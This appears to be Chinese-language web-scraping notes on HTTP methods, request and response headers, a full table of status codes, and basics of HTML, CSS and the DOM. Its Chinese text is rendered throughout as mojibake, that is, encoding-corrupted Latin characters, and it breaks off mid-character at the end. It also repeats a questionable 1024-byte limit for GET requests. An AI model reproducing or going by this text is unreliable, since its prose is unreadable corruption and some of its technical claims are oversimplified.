è¯·æ±‚ç”±å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘å‡ºï¼Œåˆ†ä¸ºè¯·æ±‚æ–¹æ³•ï¼Œè¯·æ±‚ç½‘å€ï¼Œè¯·æ±‚å¤´ä¸Žè¯·æ±‚ä½“ã€‚ è¯·æ±‚æ–¹æ³•ï¼šå¸¸è§çš„è¯·æ±‚æ–¹æ³•æœ‰GETä¸ŽPOSTã€‚GETï¼šåœ¨æµè§ˆå™¨ä¸­è¾“å…¥URLå¹¶å›žè½¦ï¼Œä¾¿å‘èµ·äº†ä¸€ä¸ªURLè¯·æ±‚ï¼Œè¯·æ±‚çš„å‚æ•°ä¼šç›´æŽ¥åŒ…å«åˆ°URLä¸­ï¼Œæ¯”å¦‚https://www.baidu.com/s?wd=python,å‚æ•°wdå°±è¡¨ç¤ºè¦æœç´¢çš„å…³é”®å­—ã€‚POSTè¯·æ±‚å¤§å¤šåœ¨è¡¨å•æäº¤æ—¶å‘èµ·ï¼Œç”¨äºŽæäº¤æ•°æ®ç­‰ï¼Œå…¶æ•°æ®ä»¥è¡¨å•çš„å½¢å¼ä¼ è¾“ï¼Œè€Œä¸ä¼šä½“çŽ°åœ¨URLä¸­ã€‚ äºŒè€…åŒºåˆ«ï¼šGETè¯·æ±‚çš„å‚æ•°åŒ…å«åœ¨URLä¸­ï¼Œæ•°æ®èƒ½å¤Ÿç›´æŽ¥çœ‹åˆ°ã€‚è€ŒPOSTçš„æ•°æ®ä¼šåŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ï¼ŒURLä¸­çœ‹ä¸åˆ°ã€‚GETè¯·æ±‚æäº¤çš„æ•°æ®æœ€å¤šåªæœ‰1024å­—èŠ‚ï¼Œè€ŒPOSTæ— é™åˆ¶ã€‚ä¸€èˆ¬æ¥è¯´ä¼ é€’æ•æ„Ÿä¿¡æ¯ä¸Žå‘é€è¾ƒå¤§æ–‡ä»¶ï¼Œéƒ½ç”¨POSTè¯·æ±‚ã€‚ 1 GET è¯·æ±‚æŒ‡å®šçš„é¡µé¢ä¿¡æ¯ï¼Œå¹¶è¿”å›žå®žä½“ä¸»ä½“ã€‚ 2 HEAD ç±»ä¼¼äºŽ GET è¯·æ±‚ï¼Œåªä¸è¿‡è¿”å›žçš„å“åº”ä¸­æ²¡æœ‰å…·ä½“çš„å†…å®¹ï¼Œç”¨äºŽèŽ·å–æŠ¥å¤´ 3 POST å‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POST è¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„å»ºç«‹å’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚ 4 PUT ä»Žå®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€çš„æ•°æ®å–ä»£æŒ‡å®šçš„æ–‡æ¡£çš„å†…å®¹ã€‚ 5 DELETE è¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŒ‡å®šçš„é¡µé¢ã€‚ 6 CONNECT HTTP/1.1 åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿žæŽ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚ 7 OPTIONS å…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹æœåŠ¡å™¨çš„æ€§èƒ½ã€‚ 8 TRACE å›žæ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºŽæµ‹è¯•æˆ–è¯Šæ–­ã€‚ 9 PATCH æ˜¯å¯¹ PUT æ–¹æ³•çš„è¡¥å……ï¼Œç”¨æ¥å¯¹å·²çŸ¥èµ„æºè¿›è¡Œå±€éƒ¨æ›´æ–° ã€‚ è¯·æ±‚ç½‘å€ï¼šURLï¼Œèƒ½å¤Ÿç¡®å®šè¯·æ±‚çš„èµ„æºã€‚ è¯·æ±‚å¤´ï¼šç”¨äºŽè¯´æ˜ŽæœåŠ¡å™¨è¦ä½¿ç”¨çš„é™„åŠ ä¿¡æ¯ï¼Œå¦‚Cookieï¼ŒRefererï¼ŒUser-Agent å¸¸ç”¨çš„å¤´ä¿¡æ¯ï¼š Acceptï¼šè¯·æ±‚æŠ¥å¤´åŸŸï¼Œç”¨äºŽæŒ‡å®šå®¢æˆ·ç«¯å¯ä»¥æŽ¥å—å“ªäº›ç±»åž‹çš„ä¿¡æ¯ã€‚ Hostï¼šç”¨äºŽæŒ‡å®šè¯·æ±‚èµ„æºçš„ä¸»æœºIPå’Œç«¯å£å·ï¼Œå…¶å†…å®¹ä¸ºURLçš„åŽŸå§‹æœåŠ¡å™¨/ç½‘å…³çš„ä½ç½®ã€‚ä»ŽHTTP1.1å¼€å§‹ï¼Œè¯·æ±‚å¿…é¡»åŒ…å«æ­¤å†…å®¹ã€‚ Cookieï¼šç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·è¿›è¡Œä¼šè¯è·Ÿè¸ªè€Œå­˜å‚¨åœ¨ç”¨æˆ·æœ¬åœ°çš„æ•°æ®ã€‚ä¸»è¦åŠŸèƒ½æ˜¯ç»´æŒå½“å‰ä¼šè¯ï¼Œå³ä½¿å†æ¬¡åˆ·æ–°ä¹Ÿèƒ½å¤Ÿæ— éœ€å†æ¬¡è¾“å…¥ä¿¡æ¯ã€‚Cookiesé‡Œæœ‰ä¿¡æ¯æ ‡è¯†äº†å¯¹åº”æœåŠ¡å™¨çš„ä¼šè¯ï¼Œæ¯æ¬¡æµè§ˆå™¨åœ¨è¯·æ±‚è¯¥ç«™ç‚¹é¡µé¢æ—¶ï¼Œéƒ½ä¼šåœ¨è¯·æ±‚å¤´ä¸­åŠ å…¥Cookieså¹¶å°†å…¶å‘é€ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨é€šè¿‡Cookiesè¯†åˆ«å‡ºèº«ä»½ï¼Œç›´æŽ¥è¿”å›žç™»é™†åŽçš„é¡µé¢ã€‚ Refererï¼šç”¨äºŽæ ‡è¯†è¿™ä¸ªè¯·æ±‚çš„æ¥æºï¼ŒæœåŠ¡å™¨å¯ä»¥æ‹¿åˆ°æ­¤ä¿¡æ¯åšç›¸åº”å¤„ç†ã€‚ User-Agentï¼šUAï¼Œç‰¹æ®Šçš„å­—ç¬¦ä¸²å¤´ï¼Œå¯ä»¥ä½¿æœåŠ¡å™¨è¯†åˆ«å®¢æˆ·ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿï¼ˆç‰ˆæœ¬ï¼‰/æµè§ˆå™¨(ç‰ˆæœ¬)ã€‚åœ¨åšçˆ¬è™«æ—¶åŠ ä¸Šæ­¤ä¿¡æ¯ï¼Œå¯ä»¥ä¼ªè£…æˆæµè§ˆå™¨ï¼Œå¦åˆ™å¾ˆå¯èƒ½è¢«è¯†åˆ«ä¸ºçˆ¬è™«ã€‚ Content-Typeï¼šäº’è”ç½‘åª’ä½“ç±»åž‹ï¼ŒMIMEç±»åž‹ã€‚å®ƒç”¨äºŽè¡¨ç¤ºå…·ä½“è¯·æ±‚ä¸­çš„åª’ä½“ç±»åž‹ä¿¡æ¯ï¼š text/htmlä»£è¡¨HTMLæ ¼å¼(XMLæ•°æ®)ã€‚image/gifä»£è¡¨GIFå›¾ç‰‡ã€‚application/jsonä»£è¡¨JSONç±»åž‹ã€‚åªæœ‰è®¾ç½®Content-Typeä¸ºapplication/x-www-form-urlencodedï¼Œæ‰ä¼šä»¥è¡¨å•æ•°æ®å½¢å¼æäº¤ã€‚appilcation/jsonæ¥æäº¤(åºåˆ—åŒ–)JSONæ•°æ®ã€‚multipart/form-dataæ¥ä¸Šä¼ (è¡¨å•)æ–‡ä»¶ã€‚blablaã€‚ åœ¨çˆ¬è™«ä¸­ï¼Œå¦‚æžœè¦æž„é€ POSTè¯·æ±‚ï¼Œéœ€è¦ä½¿ç”¨æ­£ç¡®çš„Content-Typeï¼Œå¹¶äº†è§£å„ç§è¯·æ±‚åº“çš„å„ä¸ªå‚æ•°è®¾ç½®æ—¶ä½¿ç”¨çš„æ˜¯å“ªç§Typeï¼Œä¸ç„¶ä¼šå¯¼è‡´POSTæäº¤åŽæ— æ³•æ­£å¸¸å“åº”ã€‚ è¯·æ±‚ä½“ï¼šè¯·æ±‚ä½“ä¸€èˆ¬æ‰¿è½½çš„å†…å®¹æ˜¯POSTè¯·æ±‚ä¸­çš„è¡¨å•æ•°æ®ï¼Œç›¸å¯¹äºŽGETè¯·æ±‚ï¼Œè¯·æ±‚ä½“ä¸ºç©ºã€‚ å“åº”ï¼šç”±æœåŠ¡ç«¯è¿”å›žç»™å®¢æˆ·ç«¯ï¼Œå¯ä»¥åˆ†æˆå“åº”çŠ¶æ€ç Request Status Codeï¼Œå“åº”å¤´Response Headerså’Œå“åº”ä½“Response Bodyã€‚ å“åº”çŠ¶æ€ç ï¼šè¡¨ç¤ºæœåŠ¡å™¨çš„å“åº”çŠ¶æ€ï¼Œåœ¨çˆ¬è™«ä¸­æˆ‘ä»¬æ ¹æ®çŠ¶æ€ç æ¥åˆ¤æ–­å“åº”çŠ¶æ€ã€‚ 1** ä¿¡æ¯ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œ 2** æˆåŠŸï¼Œæ“ä½œè¢«æˆåŠŸæŽ¥æ”¶å¹¶å¤„ç† 3** é‡å®šå‘ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œä»¥å®Œæˆè¯·æ±‚ 4** å®¢æˆ·ç«¯é”™è¯¯ï¼Œè¯·æ±‚åŒ…å«è¯­æ³•é”™è¯¯æˆ–æ— æ³•å®Œæˆè¯·æ±‚ 5** æœåŠ¡å™¨é”™è¯¯ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯ 100 Continue ç»§ç»­ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­å…¶è¯·æ±‚ 101 Switching Protocols åˆ‡æ¢åè®®ã€‚æœåŠ¡å™¨æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚åˆ‡æ¢åè®®ã€‚åªèƒ½åˆ‡æ¢åˆ°æ›´é«˜çº§çš„åè®®ï¼Œä¾‹å¦‚ï¼Œåˆ‡æ¢åˆ°HTTPçš„æ–°ç‰ˆæœ¬åè®® 200 OK è¯·æ±‚æˆåŠŸã€‚ä¸€èˆ¬ç”¨äºŽGETä¸ŽPOSTè¯·æ±‚ 201 Created å·²åˆ›å»ºã€‚æˆåŠŸè¯·æ±‚å¹¶åˆ›å»ºäº†æ–°çš„èµ„æº 202 Accepted å·²æŽ¥å—ã€‚å·²ç»æŽ¥å—è¯·æ±‚ï¼Œä½†æœªå¤„ç†å®Œæˆ 203 Non-Authoritative Information éžæŽˆæƒä¿¡æ¯ã€‚è¯·æ±‚æˆåŠŸã€‚ä½†è¿”å›žçš„metaä¿¡æ¯ä¸åœ¨åŽŸå§‹çš„æœåŠ¡å™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå‰¯æœ¬ 204 No Content æ— å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†ï¼Œä½†æœªè¿”å›žå†…å®¹ã€‚åœ¨æœªæ›´æ–°ç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯ç¡®ä¿æµè§ˆå™¨ç»§ç»­æ˜¾ç¤ºå½“å‰æ–‡æ¡£ 205 Reset Content é‡ç½®å†…å®¹ã€‚æœåŠ¡å™¨å¤„ç†æˆåŠŸï¼Œç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰åº”é‡ç½®æ–‡æ¡£è§†å›¾ã€‚å¯é€šè¿‡æ­¤è¿”å›žç æ¸…é™¤æµè§ˆå™¨çš„è¡¨å•åŸŸ 206 Partial Content éƒ¨åˆ†å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†éƒ¨åˆ†GETè¯·æ±‚ 300 Multiple Choices å¤šç§é€‰æ‹©ã€‚è¯·æ±‚çš„èµ„æºå¯åŒ…æ‹¬å¤šä¸ªä½ç½®ï¼Œç›¸åº”å¯è¿”å›žä¸€ä¸ªèµ„æºç‰¹å¾ä¸Žåœ°å€çš„åˆ—è¡¨ç”¨äºŽç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰é€‰æ‹© 301 Moved Permanently æ°¸ä¹…ç§»åŠ¨ã€‚è¯·æ±‚çš„èµ„æºå·²è¢«æ°¸ä¹…çš„ç§»åŠ¨åˆ°æ–°URIï¼Œè¿”å›žä¿¡æ¯ä¼šåŒ…æ‹¬æ–°çš„URIï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å®šå‘åˆ°æ–°URIã€‚ä»ŠåŽä»»ä½•æ–°çš„è¯·æ±‚éƒ½åº”ä½¿ç”¨æ–°çš„URIä»£æ›¿ 302 Found ä¸´æ—¶ç§»åŠ¨ã€‚ä¸Ž301ç±»ä¼¼ã€‚ä½†èµ„æºåªæ˜¯ä¸´æ—¶è¢«ç§»åŠ¨ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­ä½¿ç”¨åŽŸæœ‰URI 303 See Other æŸ¥çœ‹å…¶å®ƒåœ°å€ã€‚ä¸Ž301ç±»ä¼¼ã€‚ä½¿ç”¨GETå’ŒPOSTè¯·æ±‚æŸ¥çœ‹ 304 Not Modified æœªä¿®æ”¹ã€‚æ‰€è¯·æ±‚çš„èµ„æºæœªä¿®æ”¹ï¼ŒæœåŠ¡å™¨è¿”å›žæ­¤çŠ¶æ€ç æ—¶ï¼Œä¸ä¼šè¿”å›žä»»ä½•èµ„æºã€‚å®¢æˆ·ç«¯é€šå¸¸ä¼šç¼“å­˜è®¿é—®è¿‡çš„èµ„æºï¼Œé€šè¿‡æä¾›ä¸€ä¸ªå¤´ä¿¡æ¯æŒ‡å‡ºå®¢æˆ·ç«¯å¸Œæœ›åªè¿”å›žåœ¨æŒ‡å®šæ—¥æœŸä¹‹åŽä¿®æ”¹çš„èµ„æº 305 Use Proxy ä½¿ç”¨ä»£ç†ã€‚æ‰€è¯·æ±‚çš„èµ„æºå¿…é¡»é€šè¿‡ä»£ç†è®¿é—® 306 Unused å·²ç»è¢«åºŸå¼ƒçš„HTTPçŠ¶æ€ç  307 Temporary Redirect ä¸´æ—¶é‡å®šå‘ã€‚ä¸Ž302ç±»ä¼¼ã€‚ä½¿ç”¨GETè¯·æ±‚é‡å®šå‘ 400 Bad Request å®¢æˆ·ç«¯è¯·æ±‚çš„è¯­æ³•é”™è¯¯ï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£ 401 Unauthorized è¯·æ±‚è¦æ±‚ç”¨æˆ·çš„èº«ä»½è®¤è¯ 402 Payment Required ä¿ç•™ï¼Œå°†æ¥ä½¿ç”¨ 403 Forbidden æœåŠ¡å™¨ç†è§£è¯·æ±‚å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æ‰§è¡Œæ­¤è¯·æ±‚ 404 Not Found æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚æ‰¾åˆ°èµ„æºï¼ˆç½‘é¡µï¼‰ã€‚é€šè¿‡æ­¤ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯è®¾ç½®â€æ‚¨æ‰€è¯·æ±‚çš„èµ„æºæ— æ³•æ‰¾åˆ°â€çš„ä¸ªæ€§é¡µé¢ 405 Method Not Allowed å®¢æˆ·ç«¯è¯·æ±‚ä¸­çš„æ–¹æ³•è¢«ç¦æ­¢ 406 Not Acceptable æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚çš„å†…å®¹ç‰¹æ€§å®Œæˆè¯·æ±‚ 407 Proxy Authentication Required è¯·æ±‚è¦æ±‚ä»£ç†çš„èº«ä»½è®¤è¯ï¼Œä¸Ž401ç±»ä¼¼ï¼Œä½†è¯·æ±‚è€…åº”å½“ä½¿ç”¨ä»£ç†è¿›è¡ŒæŽˆæƒ 408 Request Time-out æœåŠ¡å™¨ç­‰å¾…å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æ—¶é—´è¿‡é•¿ï¼Œè¶…æ—¶ 409 Conflict æœåŠ¡å™¨å®Œæˆå®¢æˆ·ç«¯çš„ PUT è¯·æ±‚æ—¶å¯èƒ½è¿”å›žæ­¤ä»£ç ï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚æ—¶å‘ç”Ÿäº†å†²çª 410 Gone å®¢æˆ·ç«¯è¯·æ±‚çš„èµ„æºå·²ç»ä¸å­˜åœ¨ã€‚410ä¸åŒäºŽ404ï¼Œå¦‚æžœèµ„æºä»¥å‰æœ‰çŽ°åœ¨è¢«æ°¸ä¹…åˆ é™¤äº†å¯ä½¿ç”¨410ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯é€šè¿‡301ä»£ç æŒ‡å®šèµ„æºçš„æ–°ä½ç½® 411 Length Required æœåŠ¡å™¨æ— æ³•å¤„ç†å®¢æˆ·ç«¯å‘é€çš„ä¸å¸¦Content-Lengthçš„è¯·æ±‚ä¿¡æ¯ 412 Precondition Failed å®¢æˆ·ç«¯è¯·æ±‚ä¿¡æ¯çš„å…ˆå†³æ¡ä»¶é”™è¯¯ 413 Request Entity Too Large ç”±äºŽè¯·æ±‚çš„å®žä½“è¿‡å¤§ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç†ï¼Œå› æ­¤æ‹’ç»è¯·æ±‚ã€‚ä¸ºé˜²æ­¢å®¢æˆ·ç«¯çš„è¿žç»­è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯èƒ½ä¼šå…³é—­è¿žæŽ¥ã€‚å¦‚æžœåªæ˜¯æœåŠ¡å™¨æš‚æ—¶æ— æ³•å¤„ç†ï¼Œåˆ™ä¼šåŒ…å«ä¸€ä¸ªRetry-Afterçš„å“åº”ä¿¡æ¯ 414 Request-URI Too Large è¯·æ±‚çš„URIè¿‡é•¿ï¼ˆURIé€šå¸¸ä¸ºç½‘å€ï¼‰ï¼ŒæœåŠ¡å™¨æ— æ³•å¤„ç† 415 Unsupported Media Type æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚é™„å¸¦çš„åª’ä½“æ ¼å¼ 416 Requested range not satisfiable å®¢æˆ·ç«¯è¯·æ±‚çš„èŒƒå›´æ— æ•ˆ 417 Expectation Failed æœåŠ¡å™¨æ— æ³•æ»¡è¶³Expectçš„è¯·æ±‚å¤´ä¿¡æ¯ 500 Internal Server Error æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ï¼Œæ— æ³•å®Œæˆè¯·æ±‚ 501 Not Implemented æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„åŠŸèƒ½ï¼Œæ— æ³•å®Œæˆè¯·æ±‚ 502 Bad Gateway ä½œä¸ºç½‘å…³æˆ–è€…ä»£ç†å·¥ä½œçš„æœåŠ¡å™¨å°è¯•æ‰§è¡Œè¯·æ±‚æ—¶ï¼Œä»Žè¿œç¨‹æœåŠ¡å™¨æŽ¥æ”¶åˆ°äº†ä¸€ä¸ªæ— æ•ˆçš„å“åº” 503 Service Unavailable ç”±äºŽè¶…è½½æˆ–ç³»ç»Ÿç»´æŠ¤ï¼ŒæœåŠ¡å™¨æš‚æ—¶çš„æ— æ³•å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚å»¶æ—¶çš„é•¿åº¦å¯åŒ…å«åœ¨æœåŠ¡å™¨çš„Retry-Afterå¤´ä¿¡æ¯ä¸­ 504 Gateway Time-out å……å½“ç½‘å…³æˆ–ä»£ç†çš„æœåŠ¡å™¨ï¼ŒæœªåŠæ—¶ä»Žè¿œç«¯æœåŠ¡å™¨èŽ·å–è¯·æ±‚ 505 HTTP Version not supported æœåŠ¡å™¨ä¸æ”¯æŒè¯·æ±‚çš„HTTPåè®®çš„ç‰ˆæœ¬ï¼Œæ— æ³•å®Œæˆå¤„ç† å“åº”å¤´ï¼šåŒ…å«æœåŠ¡å™¨å¯¹è¯·æ±‚çš„åº”ç­”ä¿¡æ¯ï¼š Date:å“åº”æ ‡è¯†äº§ç”Ÿçš„æ—¶é—´ Last-Modifiedï¼šæŒ‡å®šèµ„æºçš„æœ€åŽä¿®æ”¹æ—¶é—´ã€‚ Content-Encodingï¼šæŒ‡å®šå“åº”å†…å®¹çš„ç¼–ç ã€‚ Serverï¼šåŒ…å«æœåŠ¡å™¨çš„ä¿¡æ¯ï¼Œåç§°ï¼Œç‰ˆæœ¬å·ç­‰ã€‚ Content-Type:è¿”å›žçš„æ–‡æ¡£ç±»åž‹ã€‚ Set-Cookieï¼šè®¾ç½®Cookiesã€‚å“åº”å¤´ä¸­çš„Set-Cookieå‘Šè¯‰æµè§ˆå™¨éœ€è¦å°†æ­¤å†…å®¹æ”¾åœ¨Cookiesä¸­ï¼Œä¸‹æ¬¡è¯·æ±‚æºå¸¦Cookiesè¯·æ±‚ã€‚ Expires:æŒ‡å®šå“åº”çš„è¿‡æœŸæ—¶é—´ï¼Œå¯ä»¥ä½¿ä»£ç†æœåŠ¡å™¨æˆ–æµè§ˆå™¨å°†åŠ è½½çš„å†…å®¹æ›´æ–°åˆ°ç¼“å­˜ä¸­ã€‚å¦‚æžœå†æ¬¡è®¿é—®ï¼Œå°±å¯ä»¥ç›´æŽ¥ä»Žç¼“å­˜ä¸­åŠ è½½ï¼Œä»¥é™ä½ŽæœåŠ¡å™¨è´Ÿè½½ï¼Œç¼©çŸ­åŠ è½½æ—¶é—´ã€‚ å“åº”ä½“ï¼šå“åº”çš„æ­£æ–‡æ•°æ®éƒ½åœ¨å“åº”ä½“ä¸­ï¼Œä¾‹å¦‚è¯·æ±‚ç½‘é¡µæ—¶ï¼Œå…¶å“åº”ä½“å°±æ˜¯çŽ‹çˆ·çš„HTMLä»£ç ã€‚è¯·æ±‚å›¾ç‰‡æ—¶ä¾¿æ˜¯å›¾ç‰‡çš„äºŒè¿›åˆ¶æ•°æ®ã€‚åšçˆ¬è™«è¯·æ±‚ç½‘é¡µåŽè¦è§£æžçš„å†…å®¹å°±æ˜¯å“åº”ä½“ã€‚ ç½‘é¡µåŸºç¡€åŸºæœ¬ç»„æˆï¼Œç»“æž„å’ŒèŠ‚ç‚¹ç­‰å†…å®¹ã€‚ ç½‘é¡µçš„ç»„æˆï¼šHTML.CSS.JavaScriptï¼ŒHTMLç›¸å½“äºŽéª¨æž¶ï¼ŒCSSç›¸å½“äºŽçš®è‚¤ï¼ŒJavaScriptç›¸å½“äºŽè‚Œè‚‰ã€‚ HTMLï¼šç”±äºŽå­¦æ ¡è¯¾ç¨‹å­¦è¿‡æ¯”è¾ƒç†Ÿæ‚‰ï¼Œå®ƒæ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ã€‚ä¸åŒç±»åž‹çš„æ–‡å­—é€šè¿‡ä¸åŒç±»åž‹çš„æ ‡ç­¾æ¥è¡¨ç¤ºï¼Œå¦‚imgï¼Œpç­‰æ ‡ç­¾ã€‚ä»–ä»¬ä¹‹é—´çš„å¸ƒå±€åˆå¸¸é€šè¿‡å¸ƒå±€æ ‡ç­¾divåµŒå¥—ç»„åˆè€Œæˆï¼Œå„ç§æ ‡ç­¾é€šè¿‡ä¸åŒçš„æŽ’åˆ—å’ŒåµŒå¥—å½¢æˆç½‘é¡µçš„æ¡†æž¶ã€‚ CSSï¼šåªæœ‰HTMLçš„é¡µé¢å¸ƒå±€å¹¶ä¸ç¾Žè§‚ï¼ŒCSSå…¨ç§°Cascading Style Sheets,å³å±‚å æ ·å¼è¡¨ã€‚å±‚å æ˜¯æŒ‡å½“åœ¨HTMLä¸­å¼•ç”¨äº†æ•°ä¸ªæ ·å¼æ–‡ä»¶ï¼Œå¹¶ä¸”æ ·å¼å‘ç”Ÿå†²çªæ—¶ï¼Œæµè§ˆå™¨èƒ½å¤Ÿä¾æ®å±‚å é¡ºåºå¤„ç†ã€‚æ ·å¼æŒ‡ç½‘é¡µä¸­æ–‡å­—å¤§å°ï¼Œé¢œè‰²ï¼Œå…ƒç´ é—´è·æŽ’åˆ—ç­‰æ ¼å¼ã€‚ 1234567891011//å¤§æ‹¬å·å‰æ˜¯ä¸€ä¸ªCSSé€‰æ‹©å™¨ï¼Œæ„æ€æ˜¯é€‰æ‹©idä¸ºhead_wrpperä¸”classä¸ºs-ps-liteçš„èŠ‚ç‚¹ï¼Œç„¶åŽå†é€‰ä¸­å…¶å†…éƒ¨çš„classä¸ºs-p-topçš„èŠ‚ç‚¹ã€‚å¤§æ‹¬å·å†…éƒ¨å†™çš„æ˜¯æ ·å¼è§„åˆ™ã€‚#head_wrapper.s-ps-islite,s-p-top&#123;//positionæŒ‡å®šäº†è¿™ä¸ªå…ƒç´ çš„å¸ƒå±€æ–¹å¼ä¸ºç»å¯¹å¸ƒå±€ position:absolute;//bottomæŒ‡å®šå…ƒç´ çš„ä¸‹è¾¹è·ä¸º40px bottom:40px;//widthæŒ‡å®šäº†å®½åº¦ä¸º100%å æ»¡çˆ¶å…ƒç´  width:100%;//heightæŒ‡å®šå…ƒç´ çš„é«˜åº¦ height:181px;&#125; åœ¨ç½‘é¡µä¸­ï¼Œä¸€èˆ¬ä¼šç»Ÿä¸€å®šä¹‰æ•´ä¸ªç½‘é¡µçš„CSSæ ·å¼è§„åˆ™ï¼Œå¹¶å†™å…¥CSSæ–‡ä»¶ä¸­ï¼ˆåŽç¼€ä¸ºcssï¼‰ã€‚åœ¨HTMLä¸­åªè¦ç”¨linkæ ‡ç­¾å°±èƒ½å¤Ÿå¼•å…¥å†™å¥½çš„cssæ–‡ä»¶ã€‚ JavaScript:æ˜¯ä¸€ç§è„šæœ¬è¯­è¨€ï¼ŒHTMLä¸ŽCSSé…åˆä½¿ç”¨ï¼Œæä¾›ç»™ç”¨æˆ·çš„åªæ˜¯ä¸€ç§é™æ€çš„ä¿¡æ¯ç¼ºä¹äº¤äº’ï¼Œè¿™è¦é JSå®žçŽ°ã€‚JSé€šå¸¸ä¹Ÿæ˜¯ä»¥å•ç‹¬çš„æ–‡ä»¶åŠ è½½çš„ï¼ŒåŽç¼€ä¸ºjsï¼Œé€šè¿‡åœ¨HTMLæ ‡ç­¾å¼•ç”¨ã€‚ ç½‘é¡µçš„ç»“æž„ï¼štitleæ ‡ç­¾å®šä¹‰æ ‡é¢˜ï¼Œä¼šæ˜¾ç¤ºåœ¨ç½‘é¡µçš„é€‰é¡¹å¡ä¸­ï¼Œè€Œä¸ä¼šæ˜¾ç¤ºåœ¨æ­£æ–‡ã€‚bodyæ ‡ç­¾æ˜¯ç½‘é¡µæ­£æ–‡ä¸­æ˜¾ç¤ºçš„å†…å®¹ï¼Œdivæ ‡ç­¾å®šä¹‰äº†ç½‘é¡µä¸­çš„åŒºå—ï¼Œå®ƒçš„idæ˜¯containerï¼Œå±žäºŽéžå¸¸å¸¸ç”¨å±žæ€§ï¼Œå¹¶ä¸”idçš„å†…å®¹åœ¨ç½‘é¡µä¸­æ˜¯å”¯ä¸€çš„ï¼Œä¾¿äºŽå®šä½ã€‚class=wrapperçš„divæ ‡ç­¾ï¼Œç»å¸¸ä¸ŽCSSé…åˆä½¿ç”¨æ¥è®¾å®šæ ·å¼ã€‚æ¯ä¸ªæ ‡ç­¾å…ƒç´ éƒ½æœ‰è‡ªå·±çš„classå±žæ€§ã€‚ èŠ‚ç‚¹æ ‘ä»¥åŠèŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»ï¼šåœ¨THMLä¸­ï¼Œæ‰€æœ‰æ ‡ç­¾çš„å®šä¹‰éƒ½æ˜¯èŠ‚ç‚¹ï¼Œå®ƒä»¬æž„æˆäº†ä¸€ä¸ªHTML DOMæ ‘ã€‚DOMå…¨ç§°Document Object Modelï¼Œæ–‡æ¡£å¯¹è±¡æ¨¡åž‹ã€‚å®šä¹‰äº†è®¿é—®HTMLä¸ŽXMLçš„æ–‡æ¡£æ ‡å‡†ã€‚W3Cæ–‡æ¡£å¯¹è±¡æ¨¡åž‹DOMæ˜¯ä¸­ç«‹äºŽå¹³å°å’Œè¯­è¨€çš„æŽ¥å£ï¼Œå®ƒå…è®¸ç¨‹åºå’Œè„šæœ¬åŠ¨æ€åœ°è®¿é—®å’Œæ›´æ–°æ–‡æ¡£çš„å†…å®¹ï¼Œç»“æž„ä¸Žæ ·å¼ã€‚ W3Cæ ‡å‡†è¢«åˆ†ä¸º3ä¸ªä¸åŒçš„éƒ¨åˆ†ï¼š æ ¸å¿ƒDOMï¼šé’ˆå¯¹ä»»ä½•ç»“æž„åŒ–æ–‡æ¡£çš„æ ‡å‡†æ¨¡åž‹ XML DOMï¼šé’ˆå¯¹XMLæ–‡æ¡£çš„æ ‡å‡†æ¨¡åž‹ HTML DOMï¼šé’ˆå¯¹HTMLæ–‡æ¡£çš„æ ‡å‡†æ¨¡åž‹ æ ¹æ®W3Cçš„HTML DOMæ 